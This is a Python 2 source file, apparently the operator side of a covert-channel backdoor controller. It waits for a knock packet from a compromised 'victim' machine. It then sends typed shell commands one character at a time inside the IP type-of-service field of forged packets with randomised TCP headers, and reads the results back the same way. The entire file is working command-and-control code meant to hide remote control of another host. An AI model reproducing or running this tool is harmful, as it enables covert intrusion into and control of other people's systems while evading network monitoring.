# ###################################################################
# hck.py 
# 
# main functions:
#	- 0. wait until client runs backdoor program    X
#	- 1. get input (command to execute in the backdoor program)   X
#	- 2. encrypt the command data      X
#	- 3. send encrypted data to backdoor client  X
#	- 4. wait for the response from backdoor program
#	- 5. get the results
#	- 6. decrypt the results
# 	- 7. save the decrypted results
#	- 
# ###################################################################
from scapy.all import *
from encrypt import *
import argparse
import sys
import socket
import fcntl
import struct



CHECK_COUNT = 0
RESULT = ""
WAITING = 0
KEY = "runningman"
mypacket = IP()
serv_addr = "192.168.0.9"	# by default
clnt_addr = "192.168.0.8"	# by default


def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])


def parse_arguments():
	parser = argparse.ArgumentParser()
	group = parser.add_mutually_exclusive_group()
	# group.add_argument("-i", "--net_int", action="store")
	group.add_argument("-d", "--dest_ip", action="store")
	return parser.parse_args()

def client_ran_backdoor(pkt):
	try:
		if pkt[IP].id == ord('K'):
			print "Client ran backdoor."
		else:
			print "[ERROR] Sniffed wrong packet."
			exit(1)
	except OSError as e:
		print e

def print_result():
	global RESULT
	print RESULT
	RESULT = ""

def get_result(pkt):
	global CHECK_COUNT
	global RESULT
	count = 0

	try:
		if pkt['Raw'].load is not None:
			count = int(pkt['Raw'].load)
		CHECK_COUNT += 1
	except OSError as e:
		print "[Error]", e

	#print "received value:", chr(pkt[IP].tos)
	RESULT += chr(pkt[IP].tos)
	#print "RESULT:", RESULT
	if CHECK_COUNT == count:
		print_result()
		CHECK_COUNT = 0

def main():
	global WAITING
	global KEY

	#args = parse_arguments()

	# get network interface
	serv_addr = get_ip_address('eno1')
	print serv_addr

	# 0. wait until client runs backdoor program
	print "Sniffing..."
	sniff(filter="udp and dst port 80 and src port 123", prn=client_ran_backdoor, count=1)

	#if(args.dest_ip is not None):
	# store backdoor client address
	#clnt_addr = args.dest_ip   

	# ask for the password for encryption
	#pw = raw_input("Set a password for encryption: ")

	while True:
		if WAITING == 0:
			# get command	
			print "Give me a command..."
			cmd = raw_input("# ")

			# send the length of input
			#send(IP(dst=clnt_addr)/fuzz(TCP(dport=80, sport=123))/str(len(cmd)))


			# encrypt the command before sending it to victim's machine
			#enc_cmd = encrypt(cmd, KEY)

			# send to client  using scapy
			# how to put random data on each field
			
			mypacket = IP()/fuzz(TCP())/str(len(cmd))
			mypacket.src = serv_addr
			mypacket.dst = clnt_addr
			mypacket.sport = 123
			mypacket.dport = 80

			i = 0
			for c in cmd:
				mypacket.tos = ord(c)	# ascii to int  ( opposite: str(unichr(97))  )
				#print "#", i, c
				i = i + 1
				# send forged packet
				send(mypacket)
			WAITING = 1
			print "WAITING = 1"
		else:
			sniff(filter="src 192.168.0.8 and tcp and (dst port 80 and src port 123)", prn=get_result)		
			WAITING = 0
			print "WAITING = 0"

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print("Terminate signal received. Exiting...")